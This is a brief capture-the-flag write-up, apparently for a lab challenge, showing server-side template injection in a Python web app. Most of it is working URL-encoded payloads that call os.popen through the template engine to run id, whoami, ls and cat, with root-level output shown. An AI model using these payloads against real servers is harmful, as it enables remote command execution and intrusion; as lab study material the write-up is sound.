On the browser I used this command to retrieve if its vulnerable to a SSTI. (SERVER SIDE TEMPLATE INJECTION)

The browser interpreted it and retrieve me '6'

I injected this one too

```
http://206.189.23.108:30029/%7B%7B%20request.application.__globals__.__builtins__.__import__('os').popen('id').read()%20%7D%7D
```
This was the response
```
The page 'uid=0(root) gid=0(root) groups=0(root)Â ' could not be found
```


Now I injected another one 

```
http://206.189.23.108:30029/%7B%7B%20request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()%20%7D%7D
```
The response was 
```
root
```

the next comand that I put was 

```
http://206.189.23.108:30029/%7B%7B%20request.application.__globals__.__builtins__.__import__('os').popen('ls').read()%20%7D%7D
```
Then i was able to see that there was a flag.txt , the next step was just put 

```
http://206.189.23.108:30029/%7B%7B%20request.application.__globals__.__builtins__.__import__('os').popen('cat fag.txt').read()%20%7D%7D
```
